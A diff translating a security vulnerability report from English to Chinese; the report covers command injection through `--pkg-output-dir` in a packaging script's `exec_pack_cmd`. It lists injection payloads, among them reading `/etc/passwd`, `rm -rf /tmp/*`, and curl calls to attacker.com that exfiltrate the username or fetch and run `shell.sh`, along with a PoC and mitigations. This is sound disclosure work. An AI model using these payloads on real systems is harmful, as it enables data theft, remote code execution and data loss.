@@ -1,20 +1,20 @@
 # VULN-008：packer.py命令注入漏洞
 
-## Vulnerability Summary
+## 漏洞概述
 
-| Attribute | Value |
-|-----------|-------|
+| 属性 | 值 |
+|------|-----|
 | **ID** | VULN-008 |
-| **Type** | Command Injection |
+| **类型** | Command Injection |
 | **CWE** | CWE-78 (OS Command Injection) |
-| **Severity** | Critical |
-| **Confidence** | 95% |
-| **File** | `scripts/package/common/py/packer.py` |
-| **Lines** | 206-220 |
-| **Function** | `exec_pack_cmd` |
-| **Status** | CONFIRMED - Real Vulnerability |
+| **严重性** | Critical |
+| **置信度** | 95% |
+| **文件** | `scripts/package/common/py/packer.py` |
+| **行号** | 206-220 |
+| **函数** | `exec_pack_cmd` |
+| **状态** | 已确认 - 真实漏洞 |
 
-## Vulnerable Code
+## 漏洞代码
 
 ```python
 def exec_pack_cmd(delivery_dir: str,
@@ -22,11 +22,11 @@ def exec_pack_cmd(delivery_dir: str,
                  package_name: str) -> str: 
     """执行打包命令"""
     if delivery_dir:
-        cmd = f'cd {delivery_dir} && {pack_cmd}'  # VULNERABLE: f-string interpolation
+        cmd = f'cd {delivery_dir} && {pack_cmd}'  # 漏洞点: f-string拼接
     else:
         cmd = pack_cmd
     CommLog.cilog_info("package cmd:%s", cmd)
-    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)  # VULNERABLE: shell=True
+    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)  # 漏洞点: shell=True
     output = result.stdout.decode()
     if result.returncode != 0:
         CommLog.cilog_error(__file__, "compress package(%s) failed! %s.", package_name, output)
@@ -34,12 +34,12 @@ def exec_pack_cmd(delivery_dir: str,
     return package_name
 ```
 
-## Complete Data Flow Analysis
+## 完整数据流分析
 
-### 1. Primary Attack Vector: `delivery_dir`
+### 1. 主要攻击向量：delivery_dir
 
 ```
-CLI Argument --pkg-output-dir
+CLI参数 --pkg-output-dir
          │
          ▼
     args.pkg_output_dir  (package.py:808)
@@ -57,19 +57,19 @@ CLI Argument --pkg-output-dir
     subprocess.run(cmd, shell=True, ...)  (packer.py:215)
 ```
 
-### 2. Secondary Attack Vector: `pack_cmd` components
+### 2. 次要攻击向量：pack_cmd组件
 
-The `pack_cmd` is constructed via `compose_makeself_command()` and includes:
-- `source_target` = `pkg_args.pkg_output_dir` (also attacker-controlled)
-- `cleanup` from XML config (`package_attr.get('cleanup')`)
-- `install_script` from XML config
-- `help_info` from XML config
+`pack_cmd` 通过 `compose_makeself_command()` 构造，包含：
+- `source_target` = `pkg_args.pkg_output_dir` (同样可被攻击者控制)
+- `cleanup` 来自XML配置 (`package_attr.get('cleanup')`)
+- `install_script` 来自XML配置
+- `help_info` 来自XML配置
 
-## Attack Vectors
+## 攻击向量
 
-### Vector 1: Direct Command-Line Injection
+### 向量1：直接命令行注入
 
-**Attack Command:**
+**攻击命令:**
 ```bash
 python scripts/package/package.py \
     --pkg-output-dir "; id; cat /etc/passwd; echo '" \
@@ -77,116 +77,116 @@ python scripts/package/package.py \
     --independent_pkg
 ```
 
-**Resulting Shell Command:**
+**生成的Shell命令:**
 ```bash
 cd ; id; cat /etc/passwd; echo ' && <pack_cmd>
 ```
 
-**Effect:** Executes `id`, `cat /etc/passwd`, then `echo` command.
+**效果:** 执行 `id`, `cat /etc/passwd`, 然后 `echo` 命令。
 
-### Vector 2: Backtick Command Substitution
+### 向量2：反引号命令替换
 
-**Attack Command:**
+**攻击命令:**
 ```bash
 python scripts/package/package.py \
     --pkg-output-dir "`whoami`" \
     --pkg-name <valid_pkg>
 ```
 
-**Resulting Shell Command:**
+**生成的Shell命令:**
 ```bash
 cd `whoami` && <pack_cmd>
 ```
 
-### Vector 3: Variable Expansion
+### 向量3：变量扩展
 
-**Attack Command:**
+**攻击命令:**
 ```bash
 python scripts/package/package.py \
     --pkg-output-dir '$(curl http://attacker.com/$(whoami))' \
     --pkg-name <valid_pkg>
 ```
 
-**Effect:** Exfiltrates username to attacker-controlled server.
+**效果:** 将用户名泄露到攻击者控制的服务器。
 
-### Vector 4: Newline Injection
+### 向量4：换行符注入
 
-**Attack Command:**
+**攻击命令:**
 ```bash
 python scripts/package/package.py \
     --pkg-output-dir $'/tmp\nrm -rf /tmp/*\n#' \
     --pkg-name <valid_pkg>
 ```
 
-## Exploitation Scenarios
+## 利用场景
 
-### Scenario 1: CI/CD Pipeline Compromise
+### 场景1：CI/CD流水线入侵
 
-If this script is used in a CI/CD pipeline where build parameters can be influenced:
-1. Attacker gains access to build configuration or environment
-2. Modifies `--pkg-output-dir` parameter in build script
-3. Arbitrary commands execute during packaging phase
-4. Potential for supply chain attack on downstream consumers
+如果此脚本用于CI/CD流水线，构建参数可被影响：
+1. 攻击者获取构建配置或环境访问权限
+2. 修改构建脚本中的 `--pkg-output-dir` 参数
+3. 打包阶段执行任意命令
+4. 可能对下游消费者进行供应链攻击
 
-### Scenario 2: Developer Machine Compromise
+### 场景2：开发者机器入侵
 
-If an attacker can trick a developer into running:
+如果攻击者能诱骗开发者运行：
 ```bash
-# Malicious "build script" from untrusted source
+# 来自不可信源的恶意"构建脚本"
 python scripts/package/package.py --pkg-output-dir "$(curl attacker.com/shell.sh|sh)" ...
 ```
 
-### Scenario 3: Privilege Escalation
+### 场景3：权限提升
 
-If the script runs with elevated privileges (e.g., in Docker with root, or via sudo):
-- Full system compromise
-- Data exfiltration
-- Persistent backdoor installation
+如果脚本以提升权限运行（如Docker中用root，或通过sudo）：
+- 完全系统入侵
+- 数据泄露
+- 持久化后门安装
 
-## Attack Complexity Assessment
+## 攻击复杂度评估
 
-| Factor | Rating | Reason |
-|--------|--------|--------|
-| **Attack Vector** | Local/Adjacent | Requires ability to invoke script with crafted arguments |
-| **Attack Complexity** | Low | No special conditions required |
-| **Privileges Required** | Low | Need to invoke build script |
-| **User Interaction** | None | Once arguments are controlled, no interaction needed |
-| **Scope** | Unchanged | Affects only the system running the script |
-| **Impact** | High | Full command execution with script's privileges |
+| 因素 | 评级 | 原因 |
+|------|------|------|
+| **攻击向量** | Local/Adjacent | 需要能以构造参数调用脚本 |
+| **攻击复杂度** | Low | 无特殊条件要求 |
+| **所需权限** | Low | 需要调用构建脚本 |
+| **用户交互** | None | 参数被控制后无需交互 |
+| **范围** | Unchanged | 仅影响运行脚本的系统 |
+| **影响** | High | 以脚本权限完全命令执行 |
 
-## Exploitability: MEDIUM-HIGH
+## 可利用性：中高
 
-### Factors Reducing Exploitability:
-1. Script is a build tool, not an internet-facing service
-2. Requires ability to control command-line arguments
-3. Attacker typically already has similar access level
+### 降低可利用性的因素
+1. 脚本是构建工具，不是面向互联网的服务
+2. 需要能控制命令行参数
+3. 攻击者通常已有类似访问级别
 
-### Factors Increasing Exploitability:
-1. Common in CI/CD pipelines where parameters can be injected
-2. `shell=True` with f-string is a classic injection pattern
-3. No input sanitization whatsoever
-4. Used in software supply chain (CANN is Huawei's AI framework)
+### 增加可利用性的因素
+1. 在CI/CD流水线中常见，参数可被注入
+2. `shell=True` 配合 f-string 是经典注入模式
+3. 完全无输入清洗
+4. 用于软件供应链（CANN是华为AI框架）
 
-## Proof of Concept
+## 概念验证
 
 ```python
 #!/usr/bin/env python3
-# PoC for VULN-008 Command Injection
-# This demonstrates the vulnerability in exec_pack_cmd()
+# VULN-008命令注入PoC
+# 演示exec_pack_cmd()中的漏洞
 
 import subprocess
 
-# Simulated vulnerable function
+# 模拟漏洞函数
 def exec_pack_cmd_vulnerable(delivery_dir: str, pack_cmd: str) -> None:
-    """Vulnerable function from packer.py"""
+    """packer.py中的漏洞函数"""
     if delivery_dir:
         cmd = f'cd {delivery_dir} && {pack_cmd}'
     else:
         cmd = pack_cmd
-    print(f"[VULNERABLE] Executing: {cmd}")
-    # subprocess.run(cmd, shell=True, check=False)  # Actual vulnerable call
+    print(f"[VULNERABLE] 执行: {cmd}")
+    # subprocess.run(cmd, shell=True, check=False)  # 实际漏洞调用
 
-# Test cases demonstrating injection
+# 演示注入的测试用例
 test_cases = [
     ("; id", "echo 'test'"),
     ("$(whoami)", "echo 'test'"),
@@ -194,17 +194,17 @@ test_cases = [
     ("/tmp; curl http://attacker.com/exfil", "echo 'test'"),
 ]
 
-print("=== Command Injection PoC ===\n")
+print("=== 命令注入PoC ===\n")
 for delivery_dir, pack_cmd in test_cases:
     exec_pack_cmd_vulnerable(delivery_dir, pack_cmd)
     print()
 
-print("All payloads would execute with shell=True")
+print("所有payload将在shell=True下执行")
 ```
 
-## Recommended Mitigations
+## 推荐缓解措施
 
-### Option 1: Remove shell=True (Recommended)
+### 方案1：移除shell=True（推荐）
 
 ```python
 def exec_pack_cmd(delivery_dir: str,
@@ -212,11 +212,11 @@ def exec_pack_cmd(delivery_dir: str,
                  package_name: str) -> str:
     """执行打包命令"""
     if delivery_dir:
-        # Use subprocess without shell=True
-        # First cd to directory, then execute pack_cmd
+        # 使用subprocess不带shell=True
+        # 用cwd参数切换目录而非cd命令
         result = subprocess.run(
-            pack_cmd.split(),  # Split command into list
-            cwd=delivery_dir,  # Use cwd parameter instead of cd
+            pack_cmd.split(),  # 将命令分割为列表
+            cwd=delivery_dir,  # 用cwd参数代替cd
             check=False,
             stdout=PIPE,
             stderr=STDOUT
@@ -228,10 +228,10 @@ def exec_pack_cmd(delivery_dir: str,
             stdout=PIPE,
             stderr=STDOUT
         )
-    # ... rest of function
+    # ... 函数其余部分
 ```
 
-### Option 2: Use shlex.quote() for Sanitization
+### 方案2：使用shlex.quote()清洗
 
 ```python
 import shlex
@@ -241,15 +241,15 @@ def exec_pack_cmd(delivery_dir: str,
                  package_name: str) -> str:
     """执行打包命令"""
     if delivery_dir:
-        # Sanitize delivery_dir
+        # 清洗delivery_dir
         safe_dir = shlex.quote(delivery_dir)
         cmd = f'cd {safe_dir} && {pack_cmd}'
     else:
         cmd = pack_cmd
-    # Still prefer removing shell=True
+    # 仍建议移除shell=True
 ```
 
-### Option 3: Validate Path Input
+### 方案3：验证路径输入
 
 ```python
 import os
@@ -259,30 +259,30 @@ def exec_pack_cmd(delivery_dir: str,
                  package_name: str) -> str:
     """执行打包命令"""
     if delivery_dir:
-        # Validate that delivery_dir is a real, safe directory
+        # 验证delivery_dir是真实、安全的目录
         delivery_dir = os.path.realpath(delivery_dir)
         if not os.path.isdir(delivery_dir):
             raise ValueError(f"Invalid delivery_dir: {delivery_dir}")
-        # Additional validation: ensure path doesn't contain shell metacharacters
+        # 额外验证: 确保路径不含shell元字符
         if any(c in delivery_dir for c in ';$`|&<>(){}[]'):
             raise ValueError(f"Invalid characters in delivery_dir")
-    # ... rest of function
+    # ... 函数其余部分
 ```
 
-## References
+## 参考文献
 
 - **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
 - **OWASP**: Command Injection - https://owasp.org/www-community/attacks/Command_Injection
-- **Python Security**: subprocess.run() with shell=True - https://docs.python.org/3/library/subprocess.html#security-considerations
+- **Python安全**: subprocess.run() with shell=True - https://docs.python.org/3/library/subprocess.html#security-considerations
 
-## Conclusion
+## 结论
 
-**VERDICT: CONFIRMED - REAL VULNERABILITY**
+**判定: 已确认 - 真实漏洞**
 
-This is a confirmed command injection vulnerability. While the attack requires control over command-line arguments (reducing the attack surface), the lack of any input sanitization combined with `shell=True` creates a genuine security risk, particularly in:
+这是一个已确认的命令注入漏洞。虽然攻击需要控制命令行参数（降低了攻击面），但完全没有输入清洗配合 `shell=True` 创造了真实安全风险，特别是在：
 
-1. CI/CD environments where build parameters may be dynamically generated
-2. Build scripts that chain multiple tools together
-3. Any scenario where an attacker can influence script arguments
+1. CI/CD环境中构建参数可能动态生成
+2. 链接多个工具的构建脚本
+3. 攻击者能影响脚本参数的任何场景
 
-The vulnerability should be fixed by removing `shell=True` and using `subprocess.run()` with a list of arguments and the `cwd=` parameter for directory changes.
+漏洞应通过移除 `shell=True` 并使用 `subprocess.run()` 传递参数列表和 `cwd=` 参数来切换目录来修复。
